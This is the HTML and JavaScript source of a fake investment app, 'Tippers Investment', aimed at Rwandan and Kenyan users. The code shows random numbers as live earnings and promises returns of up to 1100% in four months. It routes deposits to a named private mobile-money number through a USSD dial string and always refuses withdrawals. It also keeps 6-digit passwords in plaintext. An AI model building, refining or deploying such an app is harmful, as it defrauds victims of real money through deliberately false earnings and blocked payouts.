<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Tippers Investment</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">

<style>

body{
margin:0;
font-family:Segoe UI;
background:#0b1120;
display:flex;
justify-content:center;
align-items:center;
height:100vh;
}

.app{
width:380px;
background:#000;
border-radius:20px;
overflow:hidden;
color:white;
display:flex;
flex-direction:column;
}

.content{
padding:20px;
height:520px;
overflow-y:auto;
animation:fade 0.4s ease;
}

@keyframes fade{
from{opacity:0;transform:translateY(10px);}
to{opacity:1;}
}

.title{color:#f59e0b;text-align:center;font-weight:bold;}
.desc{text-align:center;margin-top:10px;}

input,select{
width:100%;
padding:10px;
margin-top:5px;
border-radius:8px;
border:none;
background:#0f172a;
color:white;
}

button{
width:100%;
padding:12px;
margin-top:15px;
border:none;
border-radius:10px;
background:linear-gradient(135deg,#f59e0b,#f97316);
color:white;
font-weight:bold;
cursor:pointer;
}

.row{display:flex;gap:5px;}

.nav{
display:flex;
justify-content:space-around;
background:#020617;
padding:10px;
}

.nav div{text-align:center;cursor:pointer;}
.nav i{display:block;font-size:20px;margin-bottom:3px;}

#toast{
position:fixed;
bottom:20px;
left:50%;
transform:translateX(-50%);
background:red;
color:white;
padding:10px;
border-radius:8px;
display:none;
}

.card{
background:#111;
padding:15px;
border-radius:12px;
margin-top:10px;
}

</style>
</head>

<body>

<div class="app">

<div class="content" id="screen"></div>

<div class="nav" id="nav" style="display:none">
<div onclick="home()"><i class="fa fa-home"></i>HOME</div>
<div onclick="deposit()"><i class="fa fa-wallet"></i>DEPOSIT</div>
<div onclick="earn()"><i class="fa fa-chart-line"></i>EARN</div>
<div onclick="withdraw()"><i class="fa fa-money-bill"></i>WITHDRAW</div>
</div>

</div>

<div id="toast"></div>

<script>

let users = JSON.parse(localStorage.getItem("users")) || [];
let currentUser = null;
let depositDone = false;
let amount = 0;
let selectedPeriod = 0;

const screen=document.getElementById("screen");
const nav=document.getElementById("nav");

/* TOAST */
function toast(msg){
let t=document.getElementById("toast");
t.innerText=msg;
t.style.display="block";
setTimeout(()=>t.style.display="none",2500);
}

/* START */
function start(){
nav.style.display="none";

screen.innerHTML=`
<h2 class="title">WELCOME TO TIPPERS INVESTMENT APP !</h2>
<p class="desc">Start now and grow your income smartly in tippers earning every time.</p>
<button onclick="register()">START</button>
`;
}

/* REGISTER */
function register(){
screen.innerHTML=`
<h3 class="title">REGISTER</h3>

<input id="f" placeholder="First name">
<input id="l" placeholder="Last name">

<select id="g">
<option value="">Gender</option>
<option>Male</option>
<option>Female</option>
</select>

<div class="row">
<select id="code">
<option value="+250">RWA +250</option>
<option value="+254">KEN +254</option>
</select>
<input id="phone" placeholder="Phone">
</div>

<input id="email" placeholder="Email">
<input id="pass" placeholder="Password">
<input id="cpass" placeholder="Confirm Password">

<button onclick="doRegister()">REGISTER</button>
`;
}

function doRegister(){

if(!f.value||!l.value||!g.value||!phone.value||!email.value||!pass.value||!cpass.value){
toast("Fill all fields ❌");return;
}

if(!email.value.endsWith("@gmail.com")){
toast("Invalid email ❌");return;
}

if(!/^[0-9]{6}$/.test(pass.value)){
toast("Password must be 6 digits ❌");return;
}

if(pass.value!==cpass.value){
toast("Passwords not match ❌");return;
}

let user={email:email.value,pass:pass.value};
users.push(user);
localStorage.setItem("users",JSON.stringify(users));

toast("Registered ✔");
login();
}

/* LOGIN */
function login(){
screen.innerHTML=`
<h3 class="title">Login</h3>

<input id="le" placeholder="Email">
<input id="lp" placeholder="Password">

<div style="display:flex;justify-content:space-between">
<span onclick="forgot()" style="color:#f59e0b">Forgot password</span>
<span onclick="register()" style="color:#f59e0b">Create account</span>
</div>

<button onclick="doLogin()">LOGIN</button>
`;
}

function doLogin(){

let user=users.find(u=>u.email===le.value);

if(!user){
toast("Account not found ❌");return;
}

if(lp.value!==user.pass){
toast("Invalid password ❌");return;
}

currentUser=user;
nav.style.display="flex";
deposit();
}

/* EARN (LIVE ANIMATION) */
function earn(){

let balance = 0;

screen.innerHTML=`
<h3 class="title">Live Earnings</h3>
<div class="card">
<h1 id="live">0 RWF</h1>
<p class="desc">Your earnings are increasing in real time...</p>
</div>
`;

let i=0;
let interval=setInterval(()=>{
i += Math.floor(Math.random()*1000);
document.getElementById("live").innerText = i + " RWF";
},1000);

}

/* DEPOSIT */
function deposit(){
screen.innerHTML=`
<h3 class="title">DEPOSIT BALANCE</h3>

<input id="amt" placeholder="Amount">
<p>Minimum 5000 RWF</p>

<input id="sender" placeholder="Sender name">

<button onclick="goPayment()">CONTINUE</button>
`;
}

function goPayment(){
let a=parseInt(amt.value);

if(!a||a<5000||!sender.value){
toast("Invalid input ❌");return;
}

amount=a;
payment();
}

/* PAYMENT */
function payment(){
screen.innerHTML=`
<h3 class="title">PAYMENT</h3>
<div class="card">0795410739<br><br>BARAKA BOLINGO</div>
<button onclick="dial()">DIAL & PAY</button>
`;
}

/* DIAL */
function dial(){
screen.innerHTML=`
<div>*182*1*1*0795410739#</div>
<input type="file" id="file">
<button onclick="submitProof()">SUBMIT</button>
`;
}

function submitProof(){
if(!file.value){
toast("Upload proof ❌");return;
}
withdrawPeriod();
}

/* PERIOD */
function withdrawPeriod(){
screen.innerHTML=`
<h3 class="title">WITHDRAW PERIOD</h3>

<select id="period">
<option value="1">1day</option>
<option value="7">7days</option>
<option value="14">14days</option>
<option value="45">45days</option>
<option value="90">3month</option>
<option value="120">4month</option>
</select>

<button onclick="finish()">SEND & CONFIRM</button>
`;
}

/* PROFIT SYSTEM */
function calculateProfit(amount, period){
let rate=0;

if(period==1) rate=0.05;
if(period==7) rate=0.2;
if(period==14) rate=0.45;
if(period==45) rate=1.2;
if(period==90) rate=3;
if(period==120) rate=11;

return Math.floor(amount + (amount*rate));
}

function finish(){
selectedPeriod=period.value;
depositDone=true;

let finalAmount = calculateProfit(amount, selectedPeriod);

screen.innerHTML=`
<div class="card">
<h2 class="title">Final Balance</h2>
<h1>${finalAmount} RWF</h1>
<p class="desc">Your profit is locked.</p>
</div>
`;
}

/* HOME */
function home(){
if(!depositDone){
toast("Finish deposit first ❌");return;
}

let finalAmount = calculateProfit(amount, selectedPeriod);

screen.innerHTML=`
<div class="card">
<h2 class="title">Balance</h2>
<h1>${finalAmount} RWF</h1>
</div>
`;
}

/* WITHDRAW */
function withdraw(){
if(!depositDone){
toast("Finish deposit first ❌");return;
}

screen.innerHTML=`
<h3 class="title">WITHDRAW</h3>

<input id="wamt" placeholder="0 RWF">
<p>Minimum 7500 RWF</p>

<div class="row">
<select>
<option>RWA +250</option>
<option>KEN +254</option>
</select>
<input id="wphone">
</div>

<button onclick="doWithdraw()">WITHDRAW</button>
`;
}

function doWithdraw(){
let w=parseInt(wamt.value);

if(!w||w<7500){
toast("INVALID INPUT try again");return;
}

toast("You're not allowed to withdraw before the locked schedule.");
}

/* START */
start();

</script>

</body>
</html>
